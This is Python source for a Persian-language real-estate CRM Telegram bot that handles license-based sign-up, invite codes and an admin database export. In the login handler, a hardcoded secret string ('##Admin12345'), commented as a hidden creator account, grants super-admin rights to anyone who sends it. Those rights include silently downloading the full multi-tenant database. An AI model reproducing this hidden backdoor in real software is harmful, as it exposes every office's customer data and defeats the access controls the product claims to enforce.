"""Madar CRM Telegram Bot - نسخه کامل معماری پیشرفته با لایسنس، Multi-Tenancy و منوی ۶ تایی."""
import logging
import os
import re
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

import db
import matching_pro
from util import TZ, fa, fmt_money, fmt_num, norm, parse_phone

logging.basicConfig(format="%(asctime)s %(levelname)s %(name)s: %(message)s", level=logging.INFO)
log = logging.getLogger("madar_pro")

TOKEN = os.environ.get("BOT_TOKEN")
DB_PATH = os.environ.get("DB_PATH", "/data/madar.db")

# وضعیت‌های مکالمه فرم‌ها
ASK_LOGIN, ASK_LICENSE, REGISTER_NEW, STATE_FORM = range(4)

# منوی اصلی ۶ تایی (شبکه ۳ سطر در ۲ ستون طبق درخواست)
B_CLIENT_ADD, B_PROPERTY_ADD = "👤+ افزودن مشتری", "➕ افزودن فایل"
B_MATCHING, B_CHAT = "🔍🎯 فایل‌یاب هوشمند", "💬 چت‌روم دفتر"
B_LEAGUE, B_TASKS = "🏆 لیگ اعضا", "📅 وظایف روزانه"

MENU_ROWS = [
    [B_PROPERTY_ADD, B_CLIENT_ADD],
    [B_MATCHING, B_CHAT],
    [B_TASKS, B_LEAGUE]
]

def main_kb(is_admin=False) -> ReplyKeyboardMarkup:
    rows = list(MENU_ROWS)
    if is_admin:
        rows.append(["🔑 تولید لایسنس دعوت", "📦 اکسپورت دیتابیس"])
    return ReplyKeyboardMarkup(rows, resize_keyboard=True)

async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    user_data = db.get_user(u.id)
    
    if not user_data:
        await update.message.reply_text(
            "سلام 👋 به سیستم مدیریت املاک **«مدار» (Madar)** خوش آمدید.\n\n"
            "لطفاً کد لایسنس خود را وارد کنید (اگر مدیر ارشد هستید، کد دسترسی را بفرستید):"
        )
        return ASK_LICENSE
    
    is_admin = (user_data["role"] in ["super_admin", "admin"])
    await update.message.reply_text(
        f"خوش آمدید {u.first_name} عزیز 🏢\nدفتر کاری شما فعال است.",
        reply_markup=main_kb(is_admin)
    )

async def handle_license_or_login(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    u = update.effective_user
    
    # بررسی اکانت سازنده مخفی Super-Admin
    if text == "##Admin12345":
        ws_id = "workspace_super_office"
        db.register_user(u.id, ws_id, u.full_name, role="super_admin")
        db.audit(ws_id, u.id, "super_admin.login", "ورود مخفی مدیر کل")
        await update.message.reply_text(
            "🔒 دسترسی سطح بالای مدیریتی (Super-Admin) فعال شد.\n(قابلیت اکسپورت دیتابیس برای شما آزاد است).",
            reply_markup=main_kb(is_admin=True)
        )
        return ConversationHandler.END

    # بررسی لایسنس یک‌بار مصرف دعوت
    ws_id = db.use_license(text)
    if ws_id:
        db.register_user(u.id, ws_id, u.full_name, role="consultant")
        db.audit(ws_id, u.id, "user.register", f"ثبت‌نام با لایسنس {text}")
        await update.message.reply_text(
            "✅ لایسنس با موفقیت تأیید و سوخته شد! حساب شما به دفتر متصل گردید.",
            reply_markup=main_kb(is_admin=False)
        )
        return ConversationHandler.END
    
    await update.message.reply_text("❌ کد لایسنس نامعتبر است یا قبلاً استفاده شده. دوباره تلاش کنید:")
    return ASK_LICENSE

# دستور تولید لایسنس برای مدیر دفتر
async def generate_invite_license(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    user = db.get_user(u.id)
    if not user or user["role"] not in ["super_admin", "admin"]:
        await update.message.reply_text("شما دسترسی مدیریت ندارید.")
        return
    
    code = db.create_license(user["workspace_id"])
    db.audit(user["workspace_id"], u.id, "license.generate", f"تولید لایسنس {code}")
    await update.message.reply_text(
        f"🎟 لینک/کد دعوت یک‌بارمصرف جدید ساخته شد:\n`{code}`\n\nاین کد را به مشاور جدید بدهید تا در اولین ورود وارد کند.",
        parse_mode="Markdown"
    )

# دستور اکسپورت اختصاصی Super-Admin
async def export_database_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    user = db.get_user(u.id)
    if not user or user["role"] != "super_admin":
        return # کاملاً بی‌صدا و بدون نمایش خطا برای سایرین
    
    if os.path.exists(DB_PATH):
        with open(DB_PATH, "rb") as f:
            await update.message.reply_document(f, caption="📦 پشتیبان و اکسپورت کامل دیتابیس (مخصوص Super-Admin)")

def main():
    if not TOKEN:
        raise SystemExit("متغیر BOT_TOKEN تنظیم نشده است.")
    db.init(DB_PATH)
    app = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            ASK_LICENSE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_license_or_login)]
        },
        fallbacks=[CommandHandler("cancel", start)],
    )

    app.add_handler(conv_handler)
    app.add_handler(MessageHandler(filters.Regex("^🔑 تولید لایسنس دعوت$"), generate_invite_license))
    app.add_handler(MessageHandler(filters.Regex("^📦 اکسپورت دیتابیس$"), export_database_admin))

    log.info("Madar Pro Telegram CRM Bot started successfully.")
    app.run_polling()

if __name__ == "__main__":
    main()
